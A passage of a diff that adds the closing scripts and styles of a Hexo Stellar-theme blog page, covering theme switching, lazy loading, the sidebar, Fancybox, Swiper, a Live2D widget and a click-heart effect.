+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.33.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    document.documentElement.setAttribute('data-theme', theme)
+  }
+
+  const switchTheme = () => {
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    if (currentTheme === 'light') {
+      newTheme = 'dark'
+    } else {
+      newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      applyTheme('dark')
+    }
+  })()
+</script>
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://gcore.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  ctx.fancybox = {
+    selector: `.md-text img:not([class]), .md-text .image img`,
+    css: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
+    js: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
+  };
+  var selector = '[data-fancybox]:not(.error), .with-fancybox .atk-content img:not([atk-emoticon])';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const memos = document.getElementsByClassName('ds-memos');
+    if (memos != undefined && memos.length > 0) {
+      needFancybox = true;
+    }
+    const fancybox = document.getElementsByClassName('with-fancybox');
+    if (fancybox != undefined && fancybox.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+
+<!-- Live2D Widget -->
+<script src="https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget@latest/autoload.js"></script>
+
+<!-- Live2D Widget 位置调整和默认显示 -->
+<style>
+  #waifu {
+    position: fixed !important;
+    bottom: 20px !important;
+    right: 20px !important;
+    left: auto !important;
+    z-index: 1000 !important;
+    transform: none !important;
+    display: block !important;
+    opacity: 1 !important;
+    visibility: visible !important;
+  }
+  #waifu #live2d {
+    position: relative !important;
+    transform: none !important;
+  }
+  #waifu-toolbar {
+    position: relative !important;
+    transform: none !important;
+  }
+  #waifu-toggle {
+    display: none !important;
+  }
+</style>
+
+<!-- 点击特效 - 爱心爆炸效果 -->
+<script>
+  (function() {
+    // 创建爱心元素
+    function createHeart(x, y) {
+      const heart = document.createElement('div');
+      heart.className = 'click-heart';
+      heart.innerHTML = '❤';
+      heart.style.cssText = `
+        position: fixed;
+        left: ${x - 10}px;
+        top: ${y - 10}px;
+        font-size: 20px;
+        pointer-events: none;
+        z-index: 9999;
+        animation: heartFloat 1s ease-out forwards;
+        color: ${getRandomColor()};
+      `;
+      document.body.appendChild(heart);
+      
+      setTimeout(() => {
+        heart.remove();
+      }, 1000);
+    }
+    
+    // 随机颜色
+    function getRandomColor() {
+      const colors = [
+        '#ff6b6b', '#ff8e8e', '#ffa8a8',
+        '#ff69b4', '#ff1493', '#db7093',
+        '#ff4500', '#ff6347', '#ff7f50',
+        '#ffd700', '#ffec8b', '#ffa500'
+      ];
+      return colors[Math.floor(Math.random() * colors.length)];
+    }
+    
+    // 点击事件
+    document.addEventListener('click', function(e) {
+      // 排除特定元素
+      if (e.target.closest('button, a, input, textarea, select, .post-card, .layout-btn')) {
+        return;
+      }
+      
+      // 创建多个爱心
+      for (let i = 0; i < 3; i++) {
+        setTimeout(() => {
+          const offsetX = (Math.random() - 0.5) * 40;
+          const offsetY = (Math.random() - 0.5) * 40;
+          createHeart(e.clientX + offsetX, e.clientY + offsetY);
+        }, i * 100);
+      }
+    });
+  })();
+</script>
+
+<style>
+  @keyframes heartFloat {
+    0% {
+      opacity: 1;
+      transform: translateY(0) scale(1);
+    }
+    50% {
+      opacity: 0.8;
+      transform: translateY(-30px) scale(1.2);
+    }
+    100% {
+      opacity: 0;
+      transform: translateY(-60px) scale(0.8);
+    }
+  }
+</style></div></body></html>
